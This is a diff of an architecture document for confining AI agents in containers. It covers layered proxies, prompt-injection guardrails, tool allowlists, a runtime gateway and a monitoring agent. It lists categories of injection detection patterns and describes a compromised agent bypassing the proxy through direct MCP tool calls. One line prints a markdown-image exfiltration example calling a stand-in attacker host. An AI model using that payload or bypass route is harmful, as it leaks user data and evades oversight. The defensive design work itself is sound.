@@ -89,24 +89,46 @@ Each tier maps to a concrete configuration: a scoped API key, a proxy policy fil
 
 ---
 
+## Enterprise Security Mapping
+
+The architecture maps established enterprise endpoint security controls to AI agent equivalents. This is the organizing insight: every control that exists for managing human employees on managed devices has a structural analogue for managing AI agents in managed containers.
+
+| Enterprise Control | Purpose | Agent Equivalent |
+|---|---|---|
+| MDM (Mobile Device Management) | Enforce device config, manage lifecycle | Container orchestration + immutable config |
+| Secure Web Gateway | Filter and log web traffic | Egress proxy with domain denylist |
+| CASB (Cloud Access Security Broker) | Mediate access to cloud services | LLM proxy with guardrails |
+| DLP (Data Loss Prevention) | Prevent sensitive data exfiltration | LLM guardrails + egress content rules |
+| EDR (Endpoint Detection & Response) | Detect and respond to threats | Unified logging + anomaly detection (Sentinel) |
+| Application allowlisting | Control which software can run | Tool permission guard + skill validation + MCP tool policy |
+| Credential vault | Secure storage, rotation, access control | Infrastructure secrets + enforcer credential swap + scoped tokens |
+| Conditional Access / Zero Trust | Verify before granting access | Scoped API keys, per-agent enforcer policies, service grants |
+| API Gateway | Authenticate, route, rate-limit API calls | Enforcer sidecar (per-agent HTTP policy proxy) |
+| Network Access Control | Segment network, control lateral movement | Container network isolation |
+| UBA (User Behavior Analytics) | Baseline normal behavior, detect anomalies | Agent behavior baseline + drift detection |
+
+If your organization already operates these controls for human endpoints, the agent architecture is not a new category — it is the same category applied to a new principal type.
+
+---
+
 ## Defense Architecture
 
 The architecture uses seven independent enforcement layers. **Each layer runs in its own isolation boundary. No layer shares a trust boundary with the agent it enforces.** If one layer is misconfigured or bypassed, the others still hold.
 
 ```
 Layer 1: Network Isolation
-  Docker bridge network — agent has no direct internet access
+  Container network — agent has no direct internet access
          ↓
-Layer 2: Egress Proxy (mitmproxy)
+Layer 2: Egress Proxy
   Domain denylist, rate limits, size limits, TLS passthrough
   All agent web traffic flows through here
          ↓
-Layer 3: LLM Proxy (LiteLLM)
+Layer 3: LLM Proxy
   XPIA guardrails, scoped API keys, spend caps, model routing
   All agent LLM calls flow through here
          ↓
-Layer 4: Enforcer (HTTP policy proxy)
-  Per-agent HTTP sidecar on the agent-internal network
+Layer 4: Enforcer (per-agent HTTP policy proxy)
+  Per-agent sidecar on the agent-internal network
   Credential swap for granted services, LLM routing, request audit
   Bridges agent to infrastructure — agent's only HTTP endpoint
          ↓
@@ -117,7 +139,7 @@ Layer 6: Runtime Gateway (sidecar)
   Command policy, file policy, MCP tool policy, audit via FUSE/seccomp/Landlock/shell shim
   Runs in separate container sharing only PID namespace with agent
          ↓
-Layer 7: Continuous Monitoring (Sentinel)
+Layer 7: Continuous Monitoring
   Anomaly detection, compliance checking, log analysis across all layers
   Infrastructure agent with read-only access to all audit logs
 ```
@@ -148,7 +170,7 @@ Layer 7: Continuous Monitoring (Sentinel)
 │                                                                  │
 │  ┌─── mediation network (internet access via egress) ────────┐   │
 │  │                                                            │   │
-│  │   ask-egress (mitmproxy)    ask-litellm       ask-postgres │   │
+│  │   Egress proxy              LLM proxy         Database     │   │
 │  │   Domain denylist           Scoped API keys   (agents      │   │
 │  │   Rate limits               XPIA guardrails    cannot      │   │
 │  │   Size limits               Spend caps          reach)     │   │
@@ -159,7 +181,7 @@ Layer 7: Continuous Monitoring (Sentinel)
 │  ┌──────────┼─────────────────────┼──── agent-internal ───────┐  │
 │  │          │                     │     (no internet)          │  │
 │  │  ┌───────┴─────────────────────┴──────────────────────┐    │  │
-│  │  │ ask-enforcer (per-agent HTTP policy proxy)          │    │  │
+│  │  │ Enforcer (per-agent HTTP policy proxy)               │    │  │
 │  │  │                                                     │    │  │
 │  │  │  Routes: /v1/* → LLM provider (via egress)          │    │  │
 │  │  │          CONNECT → egress:3128 (HTTPS)              │    │  │
@@ -174,9 +196,9 @@ Layer 7: Continuous Monitoring (Sentinel)
 │  │  │  Shared PID Namespace                                │    │  │
 │  │  │                                                      │    │  │
 │  │  │  ┌─────────────────────┐  ┌────────────────────────┐ │    │  │
-│  │  │  │ ask-gateway (sidecar)│  │ ask-assistant (agent)  │ │    │  │
+│  │  │  │ Gateway (sidecar)   │  │ Agent workspace         │ │    │  │
 │  │  │  │                     │  │                         │ │    │  │
-│  │  │  │ agentsh (PID 1)     │  │ Read-only root FS       │ │    │  │
+│  │  │  │ Gateway server      │  │ Read-only root FS       │ │    │  │
 │  │  │  │ Policy engine       │  │ No caps, non-root       │ │    │  │
 │  │  │  │ FUSE provider       │  │ 2GB / 1 CPU             │ │    │  │
 │  │  │  │ Landlock sandbox    │  │                         │ │    │  │
@@ -193,9 +215,9 @@ Layer 7: Continuous Monitoring (Sentinel)
 │  │  └──────────────────────────────────────────────────────┘    │  │
 │  │                                                               │  │
 │  │  ┌──────────────────────┐                                     │  │
-│  │  │ ask-sentinel          │  Reads (RO): all audit logs        │  │
+│  │  │ Sentinel              │  Reads (RO): all audit logs        │  │
 │  │  │ (security monitor)    │  Writes: findings/                 │  │
-│  │  │ Tier: Elevated        │  Reaches: litellm:4000             │  │
+│  │  │ Tier: Elevated        │  Reaches: LLM proxy                │  │
 │  │  └──────────────────────┘                                     │  │
 │  └───────────────────────────────────────────────────────────────┘  │
 └──────────────────────────────────────────────────────────────────────┘
@@ -316,9 +338,9 @@ The gateway runs as a **separate container** from the agent, sharing only the PI
 │  Shared PID Namespace                                            │
 │                                                                  │
 │  ┌────────────────────────┐   ┌─────────────────────────────┐   │
-│  │ ask-gateway (sidecar)  │   │ ask-assistant (agent)        │   │
+│  │ Gateway (sidecar)      │   │ Agent workspace               │   │
 │  │                        │   │                              │   │
-│  │ agentsh server (PID 1) │   │ Runtime (child of gateway)   │   │
+│  │ Gateway server (PID 1) │   │ Runtime (child of gateway)   │   │
 │  │ Policy engine          │   │                              │   │
 │  │ FUSE provider          │   │ Shell: /bin/bash → shim      │   │
 │  │ Landlock sandbox       │   │ Files: workspace via FUSE    │   │
@@ -390,12 +412,12 @@ MCP servers are child processes that communicate via JSON-RPC 2.0 over stdio. Th
 The agent's workspace needs tools (runtime binaries, shell shims, skill libraries), but these tools must be delivered read-only — the agent cannot modify its own tooling. The pattern: build tools into a container image, then extract them into a named volume that is mounted read-only into the agent's workspace.
 
 ```
-Builder image (e.g., openclaw-builder)
-  → docker create → copy /opt/openclaw to named volume
-  → named volume mounted :ro into agent workspace at /opt/openclaw
+Builder image (agent runtime)
+  → docker create → copy runtime binaries to named volume
+  → named volume mounted :ro into agent workspace
 
-Builder image (e.g., agentsh-shim-builder)
-  → docker create → copy /opt/shim to named volume
+Builder image (shell shim)
+  → docker create → copy shim binary to named volume
   → named volume mounted :ro into agent workspace at /usr/local/bin
 ```
 
@@ -411,9 +433,9 @@ Guardrails scan content at two points: **pre_call** (scanning input before it re
 
 The reference implementation (Agency) ships three guardrail mechanisms that require no external services or commercial accounts:
 
-**XPIA Pattern Scanner** (regex-based, pre_call + post_call). Eight pattern detectors covering direct injection phrases, HTML comment injection, markdown image exfiltration, fetch/XHR exfiltration, role override attempts, base64-encoded instruction payloads, DNS-style data encoding in URLs, and PII patterns (SSNs). Runs as a custom LiteLLM guardrail on pre_call, and as a streaming response scanner in the enforcer sidecar on post_call. Zero external dependencies, zero cost, sub-millisecond latency.
+**XPIA Pattern Scanner** (regex-based, pre_call + post_call). Eight pattern detectors covering direct injection phrases, HTML comment injection, markdown image exfiltration, fetch/XHR exfiltration, role override attempts, base64-encoded instruction payloads, DNS-style data encoding in URLs, and PII patterns (SSNs). Runs as an LLM proxy guardrail on pre_call, and as a streaming response scanner in the enforcer sidecar on post_call. Zero external dependencies, zero cost, sub-millisecond latency.
 
-**Tool Permission Guard** (LLM tool call allowlist). Enforces a whitelist of which tools the agent is allowed to call, and can restrict tool arguments to pre-approved regex patterns. If XPIA convinces the LLM to call an unauthorized tool, the proxy blocks it. Default configuration is deny-all. Built into LiteLLM.
+**Tool Permission Guard** (LLM tool call allowlist). Enforces a whitelist of which tools the agent is allowed to call, and can restrict tool arguments to pre-approved regex patterns. If XPIA convinces the LLM to call an unauthorized tool, the proxy blocks it. Default configuration is deny-all. Built into the LLM proxy.
 
 **Gateway MCP Tool Policy** (MCP server/tool allowlist). Enforces per-server, per-tool allowlists on MCP tool calls at the OS level (sidecar container). Where the tool permission guard mediates tool calls in LLM responses at the proxy layer, the MCP policy mediates MCP tool calls between the agent process and MCP server subprocesses. A compromised agent could invoke MCP tools without going through the LLM at all, bypassing the proxy-level guard entirely. The gateway catches this. Built into the gateway sidecar.
 
@@ -424,7 +446,7 @@ Input (user message, tool output, web content)
   ├─► [pre_call]  XPIA Pattern Scanner    → regex detection (8 attack vectors)
   ├─► [pre_call]  (optional layers)       → ML detection, PII masking, URL scanning
   ▼
-LLM Call (provider API via LiteLLM)
+LLM Call (provider API via LLM proxy)
   ├─► [post_call] XPIA Pattern Scanner    → streaming response scanning (enforcer)
   ├─► [post_call] Tool Permission Guard   → validate tool calls are authorized
   ├─► [post_call] (optional layers)       → ML detection, PII masking, URL scanning
@@ -435,19 +457,19 @@ Response returned to agent
 
 ### Optional Layers
 
-The architecture supports additional guardrail layers via LiteLLM's callback system. These are not shipped with the reference implementation but can be added to any deployment:
+The architecture supports additional guardrail layers via the LLM proxy's callback system. These are not shipped with the reference implementation but can be added to any deployment:
 
-**ML-based XPIA detection** (e.g., Gray Swan Cygnal). ML models that differentiate direct injection from indirect prompt injection in tool outputs. Returns confidence scores rather than binary pattern matches. Catches sophisticated attacks that evade regex. *Commercial.*
+**ML-based XPIA detection.** ML models that differentiate direct injection from indirect prompt injection in tool outputs. Returns confidence scores rather than binary pattern matches. Catches sophisticated attacks that evade regex.
 
-**Malicious URL/domain scanning** (e.g., Pangea AI Guard). Detects malicious URLs in responses before they reach the agent — critical for catching XPIA exfiltration via rendered markdown images (`![](https://attacker.com/steal?data=...)`). *Commercial (free tier available).*
+**Malicious URL/domain scanning.** Detects malicious URLs in responses before they reach the agent — critical for catching XPIA exfiltration via rendered markdown images (`![](https://attacker.com/steal?data=...)`).
 
-**PII masking** (e.g., Microsoft Presidio). NLP-based detection and masking of personally identifiable information. Pre_call masks PII before the LLM sees it. Post_call masks PII the LLM generated. Runs locally, no external API calls. *Free, open source.*
+**PII masking.** NLP-based detection and masking of personally identifiable information. Pre_call masks PII before the LLM sees it. Post_call masks PII the LLM generated. Can run locally with no external API calls.
 
-**LLM-as-judge injection detection.** Uses a small model to classify whether content contains injection attempts. Higher accuracy than regex, lower cost than commercial ML. *Free (fractions of a cent per call).*
+**LLM-as-judge injection detection.** Uses a small model to classify whether content contains injection attempts. Higher accuracy than regex, lower cost than commercial ML.
 
 ### Defense Posture
 
-The shipped guardrails (XPIA patterns + tool permission + MCP policy) catch known attack patterns at zero cost with zero external dependencies. They work in fully network-isolated environments. Adding ML-based layers (Cygnal, Pangea) extends coverage to novel attack patterns that evade regex — but requires external service access and commercial accounts. The architecture is designed so that layers stack independently: adding or removing a layer doesn't affect the others.
+The shipped guardrails (XPIA patterns + tool permission + MCP policy) catch known attack patterns at zero cost with zero external dependencies. They work in fully network-isolated environments. Adding ML-based layers extends coverage to novel attack patterns that evade regex — but may require external service access or commercial accounts. The architecture is designed so that layers stack independently: adding or removing a layer doesn't affect the others.
 
 ---
 
@@ -589,22 +611,3 @@ For the architecture to scale from single-endpoint to enterprise without redesig
 - **Log-as-stream** — logs are structured events that can be consumed locally, shipped, or streamed — the event format is the same regardless of destination
 - **Workstation-as-template** — a workstation definition is a declarative specification that can be instantiated on a local Docker host, remote server, or cloud orchestrator
 
----
-
-## Enterprise Security Mapping
-
-The architecture maps established enterprise endpoint security controls to AI agent equivalents:
-
-| Enterprise Control | Purpose | Agent Equivalent |
-|---|---|---|
-| MDM (Mobile Device Management) | Enforce device config, manage lifecycle | Container orchestration + immutable config |
-| Secure Web Gateway | Filter and log web traffic | Egress proxy with domain denylist |
-| CASB (Cloud Access Security Broker) | Mediate access to cloud services | LLM proxy with guardrails (LiteLLM) |
-| DLP (Data Loss Prevention) | Prevent sensitive data exfiltration | LLM guardrails + egress content rules |
-| EDR (Endpoint Detection & Response) | Detect and respond to threats | Unified logging + anomaly detection (Sentinel) |
-| Application allowlisting | Control which software can run | Tool permission guard + skill validation + MCP tool policy |
-| Credential vault | Secure storage, rotation, access control | Infrastructure secrets + enforcer credential swap + scoped tokens |
-| Conditional Access / Zero Trust | Verify before granting access | Scoped API keys, per-agent enforcer policies, service grants |
-| API Gateway | Authenticate, route, rate-limit API calls | Enforcer sidecar (per-agent HTTP policy proxy) |
-| Network Access Control | Segment network, control lateral movement | Container network isolation |
-| UBA (User Behavior Analytics) | Baseline normal behavior, detect anomalies | Agent behavior baseline + drift detection |
